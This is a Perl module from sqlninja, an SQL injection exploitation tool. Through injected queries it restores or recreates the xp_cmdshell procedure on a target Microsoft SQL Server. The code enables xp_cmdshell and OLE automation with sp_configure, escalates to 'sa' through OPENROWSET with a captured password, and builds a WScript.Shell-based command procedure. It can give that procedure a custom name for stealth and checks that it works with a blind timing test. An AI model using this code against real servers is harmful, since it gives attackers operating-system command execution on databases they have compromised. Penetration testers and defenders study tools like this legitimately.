# This file is part of sqlninja
# Copyright (C) 2006-2013
# http://sqlninja.sourceforge.net
# icesurfer <r00t@northernfortress.net>
# nico <nico@leidecker.info>
# 
# Sqlninja is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Sqlninja is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.

# Recreate the xp_cmdshell procedure or an equivalent one on the target server.
# Original custom procedure by Antonin Foller (www.motobit.com),
# with the following hacks:
# 1. @Wait=1 to make inference possible
# 2. code incapsulated into sp_executesql to make 'create procedure' the
#    first statement of the batch

use strict;

our $conf;

sub resurrectxp
{
	print "[+] Trying to \"resurrect\" the xp_cmdshell procedure\n";
	print "[+] What version of SQL Server is this ?\n";
	my $ver = "0";
	my $version;
	my $cmd;
	my $command;
	my $result;
	while (($ver ne "1") and
	       ($ver ne "2") and
	       ($ver ne "f")) {
		print "  1: 2000\n";
		print "  2: 2005\n";
		print "  f: fingerprint and act accordingly\n";
		print "> ";
		$ver = <STDIN>;
		chomp($ver);
		if (($ver ne "1") and
		    ($ver ne "2") and
		    ($ver ne "f")) {
		    	print ">";
			$version = "0";
		}
		if ($ver eq "1") {
			$version = 2000;
		} elsif ($ver eq "2") {
			$version = 2005;
		} else {
			$version = fingerprint_version();
			if ($version eq "2000") {
				print "[+] Target seems a SQL Server 2000\n";
			} elsif ($version eq "2005") {
				print "[+] Target seems a SQL Server 2005\n";
			} else {
				print "[-] Version fingerprint failed...\n";
			}
		}
	}
	# If the user wants to use another name for the procedure (to be a
	# little more stealthy) then this code must not be executed
	if ($conf->{'xp_name'} eq "xp_cmdshell") {
		if ($version == 2000) {
			print "[+] Trying to reactivate xp_cmdshell using ".
						"sp_addextendedproc...\n";
			$cmd = "exec master..sp_addextendedproc 'xp_cmdshell',".
						"'xplog70.dll';";
		} else {
			print "[+] Trying to reactivate xp_cmdshell using ".
						"sp_configure...\n";
			$cmd = "exec master..sp_configure 'show advanced ".
				"options',1;reconfigure;exec master..".
				"sp_configure 'xp_cmdshell',1;reconfigure";
		}
		if ($conf->{'password'} ne "") {
			$cmd =~ s/'/''/g;
			# $cmd =~ s/ /%20/g;
			$cmd = "select * from OPENROWSET('SQLOLEDB','';'sa';'".
				$conf->{'password'}."','select 1;".$cmd."')";
		}
		$result = sendrequest($cmd);
		sleep(2);
		$result = fingerprint_shell("xp_cmdshell");
		if ($result == 1) {
			print "[+] Yes ! Now xp_cmdshell is available\n";
			exit(0);
		} else {
			print "[-] No... recreating xp_cmdshell failed\n";
			# ...cleaning up :)
			if ($version == 2000) {
				$cmd = "exec master..sp_dropextendedproc ".
					"'xp_cmdshell';";
				if ($conf->{'password'} ne "") {
					$cmd =~ s/'/''/g;
					$cmd = "select * from OPENROWSET('SQL".
					      "OLEDB','';'sa';'".$conf->{'password'}."'".
					      ",'select 1;".$cmd."')";
				}
				$result = sendrequest($cmd);
			}

		}
	}
	if ($version == 2005) {
		if ($conf->{'verbose'} == 1) {
			print "[+] Activating sp_oacreate & C.\n";
		}
		$cmd = "exec master..sp_configure 'show advanced options',1;".
		       "reconfigure;".
		       "exec master..sp_configure 'ole automation procedures'".
		       ",1;reconfigure;";
		$result = sendrequest($cmd);
	}
	# We are administrators without using OPENROWSET, then we can
	# create the new procedure
	if ($conf->{'password'} eq "") {
		print "[+] Trying to create a new ".$conf->{'xp_name'}." procedure..".
								".\n";
		$cmd =  "declare \@ice nvarchar(999);set \@ice='CREATE PROCED".
			"URE ".$conf->{'xp_name'}."(\@cmd varchar(255)) AS ".
			"DECLARE \@ID int ".
			"EXEC sp_OACreate ''WScript.Shell'',\@ID OUT ".
			"EXEC sp_OAMethod \@ID,''Run'',Null,\@cmd,0,1 ".
			"EXEC sp_OADestroy \@ID';".
			"exec master..sp_executesql \@ice;";
		if ($version == 2005) {
			$cmd=$cmd."reconfigure;";
		}
		$result = sendrequest($cmd);
		# print "[+] Testing if ".$xp_name." is working...\n";
		sleep(2);
		$result = fingerprint_shell($conf->{'xp_name'});
		if ($result == 1) {
			print "[+] ".$conf->{'xp_name'}." available ! \n";
		} else {
			print "[-] Sorry.... it did not work\n";
		}
	} else {
		print "[+] Trying to use openrowset + sp_oacreate...\n";
		$cmd = "DECLARE \@ID int ".
		       "EXEC sp_OACreate 'WScript.Shell',\@ID OUT ".
		       "EXEC sp_OAMethod \@ID,'Run',Null,".
		       "'ping -n ".$conf->{'blindtime'}." 127.0.0.1',0,1 ".
		       "EXEC sp_OADestroy \@ID";
		$result = tryblind($cmd);
		if ($result > ($conf->{'blindtime'}-2)) {
			print "[+] seems to work! Set xp_name to NULL in the ".
			      "configuration file and enjoy!\n";
		} else {
			print "[-] sorry... sp_oacreate seems to be disabled\n";
		}
	}
	exit(0);
}

1;
